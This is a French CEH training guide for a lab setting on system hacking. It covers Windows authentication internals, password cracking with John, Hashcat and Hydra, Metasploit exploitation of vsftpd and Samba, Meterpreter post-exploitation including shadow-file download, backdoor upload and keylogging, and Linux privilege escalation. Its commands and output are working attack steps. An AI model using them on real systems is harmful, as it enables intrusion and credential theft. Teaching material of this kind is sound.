# 🛡️ CEH v12 — MODULE 6 : HACKING DE SYSTÈMES
### Guide pédagogique avancé — Niveau professionnel complet | ML | exploit4040

---

## 📌 INTRODUCTION — LA PHILOSOPHIE DU HACKING DE SYSTÈMES

Les modules précédents t'ont appris à **observer, cartographier et évaluer**. Le Module 6 c'est le passage à l'action contrôlée.

Le hacking de systèmes suit une progression logique et implacable que tout professionnel doit maîtriser dans les deux sens — pour attaquer dans un contexte autorisé, et surtout pour **construire les défenses adéquates**.

```
PROGRESSION MODULE 6 :

PHASE 1 → Compromettre l'authentification
             ↓
PHASE 2 → Obtenir un accès initial
             ↓
PHASE 3 → Escalader les privilèges
             ↓
PHASE 4 → Maintenir l'accès (Persistance)
             ↓
PHASE 5 → Effacer les traces

Chaque phase dépend du succès de la précédente.
Un professionnel maîtrise les 5.
```

> **Rappel éthique absolu :** Tout ce qui suit s'applique **uniquement** dans un environnement de lab contrôlé (Metasploitable, HackTheBox, TryHackMe) ou dans le cadre d'un pentest avec **Rules of Engagement signées**. L'application sur des systèmes sans autorisation est un **crime** dans tous les pays.

---

## 📌 PARTIE 1 : AUTHENTIFICATION WINDOWS EN PROFONDEUR

Avant de craquer des mots de passe, tu dois comprendre **comment Windows stocke et vérifie les credentials**. C'est la base de tout ce qui suit.

---

### 🔵 Architecture d'authentification Windows

```
PROCESSUS D'AUTHENTIFICATION WINDOWS
═══════════════════════════════════════════════════════════════

Utilisateur tape son mot de passe
          │
          ▼
    LSASS (Local Security Authority Subsystem Service)
    → Processus critique : lsass.exe
    → Tourne en SYSTEM
    → Gère TOUTE l'authentification Windows
          │
          ├─── Authentification LOCALE ──→ Base SAM
          │                               (Security Account Manager)
          │
          └─── Authentification DOMAINE ─→ Active Directory
                                          (NTDS.dit sur le DC)
```

---

### 🔵 La base SAM — Security Account Manager

La **SAM** est la base de données locale des comptes Windows. Elle est stockée dans :

```
C:\Windows\System32\config\SAM
```

**Caractéristiques critiques :**
```
├── Chiffrée par SYSKEY depuis Windows NT 4.0 SP3
├── Verrouillée par le kernel pendant que Windows tourne
├── Hashes des mots de passe stockés (jamais le clair)
├── Sauvegarde accessible dans : C:\Windows\Repair\SAM
└── Dump possible via shadow copy ou offline
```

**Structure d'une entrée SAM :**
```
Username : RID : LM_Hash : NT_Hash

Administrateur:500:NO PASSWORD***:8846F7EAEE8FB117AD06BDD830B7586C:::
jean.muamba:1001:NO PASSWORD***:92937945B518814341DE3F726500D765:::
exploit4040:1002:NO PASSWORD***:E10ADC3949BA59ABBE56E057F20F883E:::
```

---

### 🔵 Les algorithmes de hachage Windows

#### LM Hash (LAN Manager) — OBSOLÈTE et DANGEREUX

```
Processus LM Hash :
1. Mot de passe converti en MAJUSCULES
2. Tronqué ou paddé à 14 caractères
3. Divisé en 2 blocs de 7 caractères
4. Chaque bloc chiffré avec DES (clé fixe "KGS!@#$%")
5. Résultat : 2 hashes de 8 octets concaténés

FAIBLESSES CRITIQUES :
├── Majuscules seulement → espace réduit
├── Divisé en 2 blocs → brute force parallèle
├── 7 caractères max par bloc → très rapide à craquer
└── Hash vide = AAD3B435B51404EEAAD3B435B51404EE
    (si mot de passe < 7 ou désactivé)

Exemple :
Mot de passe : "Password1"
LM Hash :      "E52CAC67419A9A224A3B108F3FA6CB6D"
→ Crackable en quelques secondes avec rainbow tables !
```

#### NT Hash (NTLM) — Standard actuel

```
Processus NT Hash :
1. Mot de passe encodé en UTF-16LE
2. Haché avec MD4
3. Résultat : 32 caractères hexadécimaux

Exemple :
Mot de passe : "Password1"
NT Hash :      "7A21990FCD3D759941E45C490F143D5F"

CARACTÉRISTIQUES :
├── Sensible à la casse (contrairement à LM)
├── Pas de sel (salt) → vulnérable aux rainbow tables
├── MD4 = algorithme rapide → bruteforce efficace
└── Pass-the-Hash possible (utiliser le hash directement)
```

#### NTLMv2 — Version réseau sécurisée

```
NTLMv2 ajoute un CHALLENGE-RESPONSE :

Client                          Serveur
  │──── Demande d'auth ────────>│
  │<─── Challenge (nonce) ──────│
  │                              │
  │ Client calcule :             │
  │ HMAC-MD5(NT_Hash, Challenge) │
  │──── Response ──────────────>│
  │                              │
  │ Serveur vérifie la response  │
  
AVANTAGE : Le hash NT n'est jamais envoyé sur le réseau
FAIBLESSE : La response peut être capturée et craquée offline
            (c'est ce que fait Responder)
```

#### Kerberos — Authentification Active Directory

```
PROCESSUS KERBEROS (simplifié) :
═════════════════════════════════════════

CLIENT          KDC (DC)            SERVEUR CIBLE
  │                │                     │
  │── AS-REQ ─────>│                     │
  │   (demande TGT)│                     │
  │                │                     │
  │<── AS-REP ─────│                     │
  │   (TGT chiffré)│                     │
  │                │                     │
  │── TGS-REQ ────>│                     │
  │   (TGT + SPN)  │                     │
  │                │                     │
  │<── TGS-REP ────│                     │
  │   (Ticket chiffré avec clé service)  │
  │                │                     │
  │──────────── AP-REQ ─────────────────>│
  │            (Ticket de service)        │
  │                │                     │
  │<─────────── AP-REP ─────────────────│
  │            (Confirmé !)              │

COMPOSANTS CLÉS :
├── KDC = Key Distribution Center (sur le DC)
├── AS  = Authentication Service
├── TGS = Ticket Granting Service
├── TGT = Ticket Granting Ticket
└── SPN = Service Principal Name

ATTAQUES KERBEROS :
├── Kerberoasting    → Craquer les tickets TGS offline
├── AS-REP Roasting  → Comptes sans pre-auth requise
├── Golden Ticket    → Forger un TGT avec hash KRBTGT
├── Silver Ticket    → Forger un ticket de service
└── Pass-the-Ticket  → Réutiliser un ticket volé
```

---

### 🔵 NTDS.dit — La base de données Active Directory

```
Localisation : C:\Windows\NTDS\ntds.dit
               (sur le Domain Controller uniquement)

Contenu :
├── Tous les comptes utilisateurs du domaine
├── Tous les hashes NT de tous les utilisateurs
├── Historique des mots de passe
├── Attributs des comptes (groupes, dernière connexion...)
└── Politiques de sécurité du domaine

Extraction (avec droits Domain Admin) :
→ DCSync attack (Mimikatz)
→ VSS shadow copy
→ ntdsutil
→ Impacket secretsdump
```

---

## 📌 PARTIE 2 : PASSWORD CRACKING — MAÎTRISE COMPLÈTE

### 🔵 Types d'attaques sur les mots de passe

```
┌──────────────────────────────────────────────────────────────────┐
│  TYPE               │  DESCRIPTION              │  VITESSE       │
├──────────────────────────────────────────────────────────────────┤
│  Dictionary Attack  │  Liste de mots connus     │  Très rapide   │
│  Bruteforce         │  Toutes combinaisons      │  Lent          │
│  Rule-based         │  Dict + règles de mutation│  Rapide        │
│  Rainbow Tables     │  Tables précalculées      │  Instantané    │
│  Mask Attack        │  Pattern connu            │  Rapide        │
│  Combinator         │  Combines 2 wordlists     │  Moyen         │
│  Hybrid             │  Dict + bruteforce        │  Moyen         │
└──────────────────────────────────────────────────────────────────┘
```

---

### 🛠️ JOHN THE RIPPER — Cracker de hashes universel

**John the Ripper (JtR)** est le cracker de hashes open source le plus polyvalent. Il supporte des centaines de formats de hashes.

#### Identifier le format d'un hash

```bash
# Identifier automatiquement le type de hash
john --list=formats | grep -i ntlm
john --list=formats | grep -i md5
john --list=formats | grep -i sha

# Avec hash-identifier
hash-identifier
  > 7A21990FCD3D759941E45C490F143D5F
```

**Sortie hash-identifier :**
```
   ####################################################################
   HASH: 7A21990FCD3D759941E45C490F143D5F

   Possible Hashs:
   [+]  MD4
   [+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

   Least Possible Hashs:
   [+]  MD5
   [+]  NTLM
   ####################################################################
```

---

#### Craquer des hashes /etc/shadow Linux

```bash
# Préparer le fichier pour John
unshadow /etc/passwd /etc/shadow > hashes_combined.txt

cat hashes_combined.txt
```

**Contenu hashes_combined.txt :**
```
root:$1$SLBRi7.0$XTZv.4b7HMBHlCNcaFBY70:0:0:root:/root:/bin/bash
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,,,:/home/user:/bin/bash
postgres:$1$Rw35ik.x$MgX4krPHCyzFEMlzZDPWx/:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//: 1002:1002:,,,:/home/service:/bin/bash
```

```bash
# Mode wordlist (dictionnaire)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_combined.txt
```

**Sortie réelle :**
```
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE4.1 4x3])
Remaining 5 password hashes with 5 different salts

Press 'q' or Ctrl-C to abort, almost any other key for status

msfadmin         (msfadmin)
user             (user)
service          (service)
postgres         (postgres)

4g 0:00:02:14  DONE (2024-11-15 17:30) 0.02982g/s 4280p/s 21400c/s
Session completed.
```

```bash
# Voir les mots de passe crackés
john --show hashes_combined.txt
```

**Sortie :**
```
root:NO PASSWORD (not cracked yet)
msfadmin:msfadmin
user:user
postgres:postgres
service:service

4 password hashes cracked, 1 left
```

> **Analyse :** 4 comptes sur 5 utilisent leur propre nom comme mot de passe. Politique désastreuse.

---

```bash
# Mode incremental (bruteforce complet)
john --incremental hashes_combined.txt

# Mode single (variations du nom d'utilisateur)
john --single hashes_combined.txt

# Mode règles (mutations du dictionnaire)
john --wordlist=rockyou.txt --rules hashes_combined.txt

# Reprendre une session interrompue
john --restore

# Format spécifique (NTLM)
john --format=NT hashes_ntlm.txt --wordlist=rockyou.txt
```

---

#### Craquer des hashes NTLM Windows

```bash
# Fichier de hashes NTLM (format: user:rid:lm:nt:::)
cat hashes_windows.txt
```

**Contenu :**
```
Administrateur:500:NO PASSWORD***:8846F7EAEE8FB117AD06BDD830B7586C:::
jean.muamba:1001:NO PASSWORD***:92937945B518814341DE3F726500D765:::
exploit4040:1002:NO PASSWORD***:E10ADC3949BA59ABBE56E057F20F883E:::
alice.dupont:1003:NO PASSWORD***:2B576ACBE6BCFDA7294D6BD18041B827:::
```

```bash
john --format=NT hashes_windows.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Sortie réelle :**
```
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 128/128 SSE4.1 4x3])

jean.muamba:Kinshasa2024
exploit4040:123456
alice.dupont:Alice2024!
Administrateur:Admin@Corp2024

4g 0:00:00:08  DONE (2024-11-15 17:35) 0.5g/s 8547Kp/s 8547Kc/s
Session completed.
```

---

### 🛠️ HASHCAT — Cracker GPU ultra-rapide

**Hashcat** est le cracker de hashes le plus rapide au monde grâce à l'accélération GPU. Là où John fait 100 000 hashes/seconde, Hashcat peut faire **plusieurs milliards/seconde** avec un bon GPU.

#### Modes Hashcat essentiels

```
┌──────────────────────────────────────────────────────────────────┐
│  MODE  │  NOM              │  DESCRIPTION                        │
├──────────────────────────────────────────────────────────────────┤
│   0    │  Straight         │  Wordlist pure                      │
│   1    │  Combination      │  Deux wordlists combinées           │
│   3    │  Brute-Force      │  Masque défini                      │
│   6    │  Hybrid Dict+Mask │  Wordlist + masque suffixe          │
│   7    │  Hybrid Mask+Dict │  Masque préfixe + wordlist          │
│   9    │  Association      │  Associatif avancé                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Types de hashes Hashcat (-m)

```
┌──────────────────────────────────────────────────────────────────┐
│  -m    │  TYPE DE HASH                                           │
├──────────────────────────────────────────────────────────────────┤
│   0    │  MD5                                                    │
│  100   │  SHA1                                                   │
│  400   │  phpPass, WordPress ($P$)                              │
│  500   │  md5crypt, MD5 Unix ($1$)                              │
│ 1000   │  NTLM (Windows)                                        │
│ 1400   │  SHA256                                                 │
│ 1700   │  SHA512                                                 │
│ 1800   │  sha512crypt Unix ($6$)                                │
│ 3000   │  LM Hash                                               │
│ 5500   │  NetNTLMv1                                             │
│ 5600   │  NetNTLMv2                                             │
│ 7500   │  Kerberos 5 AS-REQ Pre-Auth etype 23                  │
│13100   │  Kerberos 5 TGS-REP etype 23 (Kerberoasting)         │
│18200   │  Kerberos 5 AS-REP etype 23 (AS-REP Roasting)        │
│22000   │  WPA-PBKDF2-PMKID+EAPOL                               │
└──────────────────────────────────────────────────────────────────┘
```

---

#### Attaque dictionnaire (mode 0)

```bash
hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
```

**Sortie réelle :**
```
hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 PoCL 3.1+debian): Platform #1
  * Device #1: pthread-Intel(R) Core(TM) i7-8750H, 3964/7929 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries
Restored: 0/4 (0.00%)

Host memory required: 0 MB, free: 3964 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

8846f7eaee8fb117ad06bdd830b7586c:password
92937945b518814341de3f726500d765:Kinshasa2024
e10adc3949ba59abbe56e057f20f883e:123456
2b576acbe6bcfda7294d6bd18041b827:Alice2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: hashes_ntlm.txt
Time.Started.....: Fri Nov 15 17:40:12 2024 (8 secs)
Time.Estimated...: Fri Nov 15 17:40:20 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue.......: 1/1 (100.00%)
Speed.#1.........:  2189.5 kH/s (0.32ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 4/4 (100.00%) Digests (total), 4/4 (100.00%) Digests (new)
Progress.........: 17563648/14344385 (122.44%)
Rejected.........: 0/17563648 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e] -> $HEX[042a0337c2a156616d6f732103]
Started: Fri Nov 15 17:40:12 2024
Stopped: Fri Nov 15 17:40:20 2024
```

---

#### Attaque par masque (mask attack)

Les masques permettent de cibler des **patterns connus** de mots de passe.

```
Symboles de masque :
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digit (0-9)
?s = special (!@#$%^&*)
?a = all (?l+?u+?d+?s)
?h = hex lowercase (0-9a-f)
```

```bash
# Pattern : Majuscule + 6 minuscules + 2 chiffres (ex: Kinshasa24)
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?l?d?d

# Pattern : Mot de 8 caractères alphanumériques
hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Pattern : Prénom (connu) + année
hashcat -m 1000 hash.txt -a 6 prenoms.txt ?d?d?d?d
```

**Sortie :**
```
hashcat (v6.2.6) starting...

92937945b518814341de3f726500d765:Kinshasa2024

Speed.#1.........: 847.4 MH/s (2.88ms)
Progress.........: 456976384/456976384 (100.00%)
Recovered........: 1/1 (100.00%)
```

---

#### Attaque avec règles (rule-based)

Les règles mutent le dictionnaire :

```bash
# Appliquer les règles best64 (les plus efficaces)
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Règles OneRuleToRuleThemAll (très puissant)
hashcat -m 1000 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

**Exemples de règles Hashcat :**
```
c        → Capitalize first char    : password → Password
u        → Uppercase all            : password → PASSWORD
l        → Lowercase all            : PASSWORD → password
$1       → Append "1"              : password → password1
$!       → Append "!"              : password → password!
^K       → Prepend "K"             : password → Kpassword
sa@      → Substitute a→@          : password → p@ssword
{        → Rotate left             : password → asswordp
}        → Rotate right            : password → dpasswor
```

```bash
# Voir les résultats crackés
hashcat -m 1000 hash.txt --show
```

---

### 🛠️ HYDRA — Bruteforce d'authentification réseau

**Hydra** est l'outil de bruteforce en ligne (contre des services réseau actifs) le plus rapide.

```bash
# Bruteforce SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
      192.168.1.10 ssh -t 4 -V
```

**Sortie réelle :**
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-15 17:50:12
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344385 login tries (l:1/p:14344385)
[DATA] attacking ssh://192.168.1.10:22/

[ATTEMPT] target 192.168.1.10 - login "msfadmin" - pass "123456" - 1 of 14344385
[ATTEMPT] target 192.168.1.10 - login "msfadmin" - pass "password" - 2 of 14344385
[ATTEMPT] target 192.168.1.10 - login "msfadmin" - pass "12345678" - 3 of 14344385
[ATTEMPT] target 192.168.1.10 - login "msfadmin" - pass "qwerty" - 4 of 14344385
[ATTEMPT] target 192.168.1.10 - login "msfadmin" - pass "msfadmin" - 13 of 14344385
[22][ssh] host: 192.168.1.10   login: msfadmin   password: msfadmin

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 17:50:23
```

---

```bash
# Bruteforce FTP avec liste d'users + wordlist
hydra -L users.txt -P rockyou.txt 192.168.1.10 ftp -t 10

# Bruteforce HTTP POST (login web)
hydra -l admin -P rockyou.txt 192.168.1.10 \
      http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Bruteforce RDP Windows
hydra -l Administrateur -P rockyou.txt 192.168.1.15 rdp

# Bruteforce MySQL
hydra -l root -P rockyou.txt 192.168.1.10 mysql

# Bruteforce multiple services en parallèle
hydra -L users.txt -P rockyou.txt -M targets.txt ssh ftp telnet
```

**Sortie Hydra HTTP-POST :**
```
[DATA] attacking http-post-form://192.168.1.10/dvwa/login.php

[80][http-post-form] host: 192.168.1.10
    login: admin
    password: password

1 of 1 target successfully completed, 1 valid password found
```

---

### 🔵 Rainbow Tables — Attaque précalculée

```
CONCEPT :
Précalculer à l'avance des millions de paires (mot de passe → hash)
→ La recherche devient une lookup dans une table → instantané

STRUCTURE :
hash_1 → password_1
hash_2 → password_2
...
hash_N → password_N

CONTRE-MESURE : Le SEL (SALT)
Ajouter une valeur aléatoire unique avant le hachage :
hash = MD5(sel + password)
→ Même mot de passe = hashes différents
→ Rainbow tables inutilisables

Windows NTLM n'utilise PAS de sel → Rainbow tables efficaces !
Unix $6$ utilise un sel → Rainbow tables inefficaces !
```

---

## 📌 PARTIE 3 : GAINING ACCESS — OBTENIR L'ACCÈS INITIAL

### 🛠️ METASPLOIT FRAMEWORK — Architecture complète

```
ARCHITECTURE METASPLOIT :
═════════════════════════════════════════════════════

msfconsole
    │
    ├── Exploits      → Code d'exploitation de vulnérabilités
    ├── Payloads      → Ce qui s'exécute après exploitation
    │   ├── Singles   → Payload autonome (une seule pièce)
    │   ├── Stagers   → Ouvre le canal de communication
    │   └── Stages    → Téléchargé via le stager (Meterpreter)
    ├── Auxiliaries   → Scanners, fuzzers, énumération
    ├── Post          → Modules post-exploitation
    ├── Encoders      → Obfuscation du payload
    └── Nops          → Padding (no-operation)

TYPES DE PAYLOADS :
├── Singles   : shell/bind_tcp, shell/reverse_tcp
├── Meterpreter: meterpreter/reverse_tcp (avancé, en mémoire)
└── PowerShell: windows/powershell_reverse_tcp
```

---

### 🛠️ Exploitation vsftpd 2.3.4 Backdoor

```bash
msfconsole
```

**Sortie démarrage :**
```
                                                  
         .                                         .
 .

       =[ metasploit v6.3.44-dev                          ]
+ -- --=[ 2374 exploits - 1232 auxiliary - 413 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                        ]

Metasploit tip: Use the edit command to open the currently
active module in your editor

msf6 >
```

```bash
msf6 > search vsftpd
```

**Sortie :**
```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No  VSFTPD v2.3.4 Backdoor Command Execution
```

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

**Sortie :**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
PAYLOAD => cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

**Sortie exploitation :**
```
[*] 192.168.1.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.10:21 - USER: 331 Please specify the password.
[+] 192.168.1.10:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.10:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.5:34567 → 192.168.1.10:6200)
  at 2024-11-15 18:00:12 +0200

id
uid=0(root) gid=0(root) groups=0(root)

whoami
root

hostname
metasploitable

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

> **Root obtenu immédiatement** grâce à la backdoor vsftpd !

---

### 🛠️ Exploitation Samba CVE-2007-2447 avec Meterpreter

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.1.10
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.1.5
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
msf6 exploit(multi/samba/usermap_script) > run
```

**Sortie :**
```
[*] Started reverse TCP double handler on 192.168.1.5:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XTZ4M1JhUb0xjlrx;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "XTZ4M1JhUb0xjlrx\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.1.5:4444 → 192.168.1.10:55612)
  at 2024-11-15 18:05:34 +0200

id
uid=0(root) gid=0(root) groups=0(root)
```

---

### 🛠️ Session Meterpreter — L'outil de post-exploitation ultime

Meterpreter est un payload avancé qui tourne **entièrement en mémoire** (pas sur disque), utilise du trafic **chiffré**, et offre des dizaines de commandes puissantes.

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/samba/usermap_script) > run
```

**Sortie :**
```
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Command shell session 3 opened
[*] Sending stage (1017704 bytes) to 192.168.1.10
[*] Meterpreter session 3 opened (192.168.1.5:4444 → 192.168.1.10:55613)

meterpreter >
```

---

**Commandes Meterpreter essentielles avec sorties :**

```bash
meterpreter > sysinfo
```
```
Computer        : metasploitable
OS              : Linux metasploitable 2.6.24-16-server
Architecture    : i686
BuildTuple      : i486-linux-musl
Meterpreter     : x86/linux
```

```bash
meterpreter > getuid
```
```
Server username: uid=0, gid=0, euid=0, egid=0
```

```bash
meterpreter > ifconfig
```
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 16436
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface  2
============
Name         : eth0
Hardware MAC : 08:00:27:a1:bc:de
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.1.10
IPv4 Netmask : 255.255.255.0
```

```bash
meterpreter > ps
```
```
Process List
============

PID   PPID  Name           Arch  User  Path
---   ----  ----           ----  ----  ----
1     0     init           x86   root  /sbin/init
588   1     apache2        x86   root  /usr/sbin/apache2
602   588   apache2        x86   www-data /usr/sbin/apache2
614   1     vsftpd         x86   root  /usr/sbin/vsftpd
621   1     mysqld         x86   root  /usr/sbin/mysqld
634   1     postgres       x86   postgres /usr/bin/postgres
658   1     smbd           x86   root  /usr/sbin/smbd
```

```bash
meterpreter > download /etc/shadow /tmp/shadow_local
```
```
[*] Downloading: /etc/shadow -> /tmp/shadow_local
[*] Downloaded 1.19 KiB  of 1.19 KiB (100.0%): /etc/shadow -> /tmp/shadow_local
[*] download   : /etc/shadow -> /tmp/shadow_local
```

```bash
meterpreter > upload /tmp/backdoor.php /var/www/uploads/backdoor.php
```
```
[*] uploading  : /tmp/backdoor.php -> /var/www/uploads/backdoor.php
[*] Uploaded 2.00 KiB of 2.00 KiB (100.0%): /tmp/backdoor.php -> /var/www/uploads/backdoor.php
[*] upload     : /tmp/backdoor.php -> /var/www/uploads/backdoor.php
```

```bash
meterpreter > shell
```
```
Process 1234 created.
Channel 1 created.

# Maintenant dans un shell bash complet
id && uname -a
uid=0(root) gid=0(root) groups=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 i686 GNU/Linux
```

```bash
# Retour à Meterpreter
Ctrl+Z
# ou
background
```

```bash
meterpreter > keyscan_start
```
```
Starting the keystroke sniffer...
```

```bash
meterpreter > keyscan_dump
```
```
Dumping captured keystrokes...
ls -la<Return>cat /etc/passwd<Return>su root<Return>toor<Return>
```

> **Keylogger actif** → on voit que l'utilisateur a tapé `toor` après `su root` = mot de passe root capturé !

---

## 📌 PARTIE 4 : PRIVILEGE ESCALATION LINUX

### 🔵 Philosophie de l'escalade de privilèges

```
TU AS UN SHELL EN TANT QUE :
www-data, nobody, user, msfadmin...
          │
          ▼
TU VEUX DEVENIR :
root (uid=0)
          │
          ▼
MÉTHODES :
├── SUID/SGID binaries exploitables
├── Sudo misconfiguration
├── Cron jobs mal configurés
├── Kernel exploits
├── PATH hijacking
├── NFS no_root_squash
├── Docker/LXC escape
└── Credentials dans fichiers
```

---

### 🛠️ MÉTHODE 1 : SUID Binaries

Un binaire **SUID (Set User ID)** s'exécute avec les permissions de son **propriétaire** (souvent root), peu importe qui l'exécute.

```bash
# Trouver tous les binaires SUID
find / -perm -4000 -type f 2>/dev/null
```

**Sortie réelle :**
```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/usr/bin/find        ← EXPLOITABLE !
/usr/bin/python      ← EXPLOITABLE !
/usr/bin/vim         ← EXPLOITABLE !
/usr/bin/nmap        ← EXPLOITABLE (vieille version) !
/usr/bin/less        ← EXPLOITABLE !
/usr/bin/more        ← EXPLOITABLE !
/usr/bin/cp          ← EXPLOITABLE !
```

---

**Exploiter SUID find :**
```bash
# Si /usr/bin/find est SUID root
find . -exec /bin/sh -p \; -quit
```
```
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)

# whoami
root
```

**Exploiter SUID python :**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
```
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

**Exploiter SUID vim :**
```bash
vim -c ':!/bin/sh'
# Dans vim : :set shell=/bin/sh puis :shell
```

> **Référence GTFOBins :** https://gtfobins.github.io/ recense tous les binaires Unix exploitables pour escalade de privilèges. C'est la bible de la privesc Linux.

---

### 🛠️ MÉTHODE 2 : Sudo Misconfiguration

```bash
sudo -l
```

**Sortie :**
```
Matching Defaults entries for msfadmin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User msfadmin may run the following commands on this host:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/python
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /bin/bash
```

**Exploitations :**

```bash
# NOPASSWD bash → trivial
sudo bash
# id → uid=0(root)

# NOPASSWD python
sudo python -c 'import pty; pty.spawn("/bin/bash")'

# NOPASSWD awk
sudo awk 'BEGIN {system("/bin/bash")}'

# NOPASSWD nano → écrire dans /etc/passwd
sudo nano /etc/passwd
# Ajouter : hacker:$1$hacker$hash:0:0:root:/root:/bin/bash
# Puis : su hacker

# NOPASSWD less → spawn shell depuis less
sudo less /etc/passwd
# Dans less taper : !/bin/bash

# NOPASSWD find
sudo find / -name passwd -exec /bin/bash \;
```

---

### 🛠️ MÉTHODE 3 : Cron Jobs mal configurés

```bash
# Voir les cron jobs système
cat /etc/crontab
```

**Sortie :**
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

# Script de backup tournant en root toutes les minutes
* * * * *   root    /opt/scripts/backup.sh
```

```bash
# Vérifier les permissions du script
ls -la /opt/scripts/backup.sh
```
```
-rwxrwxrwx 1 root root 45 Nov 15 08:00 /opt/scripts/backup.sh
```

> **Permission 777** = tout le monde peut modifier ce script qui tourne en root !

```bash
# Injecter une commande dans le script
echo "chmod +s /bin/bash" >> /opt/scripts/backup.sh

# Attendre 1 minute que le cron s'exécute
sleep 60

